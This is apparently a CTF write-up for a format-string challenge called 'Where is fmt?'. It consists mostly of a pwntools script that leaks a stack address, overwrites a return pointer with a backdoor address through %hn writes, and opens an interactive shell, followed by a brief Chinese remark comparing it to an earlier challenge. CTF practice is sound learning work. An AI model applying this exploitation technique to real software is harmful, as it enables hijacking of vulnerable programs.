# Where is fmt?

```py
from pwn import *
context.arch="amd64"
p=remote("127.0.0.1","51264")
p.sendlineafter("nces.\n","%5$p")
ret=int(p.recvline(keepends=False),16)+0x22a1
backdoor=0x00401202
p.sendlineafter("nces.\n","%{}c%15$hn".format((ret & 0xffff)))
p.sendlineafter("nces.\n","%{}c%45$hn".format((backdoor & 0xffff)))
p.interactive()
```
去年[format_level3](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/2023/Pwn/format_level3.md)的降级版：本地和远程的args链竟然是一样的。去年两者不一样导致我盲调试调了好久